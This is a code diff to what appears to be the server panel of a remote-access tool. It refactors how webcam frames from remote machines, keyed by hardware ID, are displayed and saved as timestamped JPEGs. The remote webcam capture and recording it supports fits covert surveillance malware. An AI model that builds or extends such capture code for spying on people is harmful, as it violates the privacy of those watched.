@@ -67,12 +67,8 @@ namespace Server.Handle_Packet
                             {
                                 using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                                 {
-                                    Image image = (Image)Image.FromStream(memoryStream).Clone();
-                                    if (webcam.RenderSW.ElapsedMilliseconds >= (1000 / 20))
-                                    {
-                                        webcam.pictureBox1.Image = image;
-                                        webcam.RenderSW = Stopwatch.StartNew();
-                                    }
+                                    webcam.GetImage = (Image)Image.FromStream(memoryStream).Clone();
+                                    webcam.pictureBox1.Image = webcam.GetImage;
                                     webcam.FPS++;
                                     if (webcam.sw.ElapsedMilliseconds >= 1000)
                                     {
@@ -82,7 +78,7 @@ namespace Server.Handle_Packet
                                                 Directory.CreateDirectory(webcam.FullPath);
                                             webcam.pictureBox1.Image.Save(webcam.FullPath + $"\\IMG_{DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss")}.jpeg", ImageFormat.Jpeg);
                                         }
-                                        webcam.Text = "Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString + "    FPS:" + webcam.FPS + "    Screen:" + image.Width + " x " + image.Height + "    Size:" + Methods.BytesToString(memoryStream.Length);
+                                        webcam.Text = "Webcam:" + unpack_msgpack.ForcePathObject("Hwid").AsString + "    FPS:" + webcam.FPS + "    Screen:" + webcam.GetImage.Width + " x " + webcam.GetImage.Height + "    Size:" + Methods.BytesToString(memoryStream.Length);
                                         webcam.FPS = 0;
                                         webcam.sw = Stopwatch.StartNew();
                                     }
